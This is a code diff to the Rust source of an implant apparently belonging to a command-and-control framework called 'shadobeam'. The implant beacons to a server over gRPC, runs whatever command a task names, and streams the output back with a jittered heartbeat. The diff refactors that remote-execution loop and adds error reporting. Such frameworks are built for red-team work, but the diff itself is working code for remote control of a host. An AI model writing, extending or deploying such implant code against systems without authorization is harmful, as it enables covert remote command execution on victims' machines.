@@ -6,12 +6,15 @@ use shadobeam_proto::{
     tasks::{
         beacon_service_client::BeaconServiceClient, ConnectionRequest, OutputRequest, PollRequest,
     },
-    Task,
+    OutputResult, Task,
 };
 
-use tokio::io::AsyncBufReadExt;
 use tokio::io::BufReader;
 use tokio::process::Command;
+use tokio::{
+    io::{AsyncBufReadExt, Lines},
+    process::ChildStdout,
+};
 use tonic::transport::Channel;
 
 pub struct Implant {
@@ -50,18 +53,22 @@ impl Implant {
 
     pub async fn cmd(&mut self, task: Task) -> Result<()> {
         let stream = async_stream::stream! {
-            let mut cmd = Command::new(task.code.0);
-            if let Some(args) = task.code.1 {
-                cmd.args(args);
-            }
-            let mut output = cmd.stdout(std::process::Stdio::piped()).spawn().unwrap();
-            let mut lines = BufReader::new(output.stdout.take().unwrap()).lines();
-
-            while let Some(line) = lines.next_line().await.unwrap() {
-                yield OutputRequest {
-                    task_uuid: Some(task.uuid.into()),
-                    line,
-                }
+            let task_uuid = task.uuid;
+            match cmd_reader(task) {
+                Ok(mut lines) => {
+                    while let Some(line) = lines.next_line().await.unwrap() {
+                        yield OutputRequest {
+                            task_uuid: Some(task_uuid.into()),
+                            output: Some(OutputResult::Ok(line).into()),
+                        }
+                    }
+                },
+                Err(e) => {
+                    yield OutputRequest {
+                        task_uuid: Some(task_uuid.into()),
+                        output: Some(OutputResult::Err(e.to_string()).into()),
+                    }
+                },
             }
         };
         let _response = self
@@ -70,7 +77,6 @@ impl Implant {
             .await?
             .into_inner();
 
-        // println!("Out: {}", String::from_utf8_lossy(&output.stdout));
         Ok(())
     }
 
@@ -80,4 +86,18 @@ impl Implant {
             .gen_range(self.heartbeat as f32 - offset..=self.heartbeat as f32 + offset)
             as u64
     }
+}
+fn cmd_reader(task: Task) -> Result<Lines<BufReader<ChildStdout>>> {
+    let mut cmd = Command::new(task.code.0);
+    if let Some(args) = task.code.1 {
+        cmd.args(args);
+    }
+    let mut output = cmd.stdout(std::process::Stdio::piped()).spawn()?;
+    Ok(BufReader::new(
+        output
+            .stdout
+            .take()
+            .ok_or(anyhow!("Could not take stdout"))?,
+    )
+    .lines())
 }
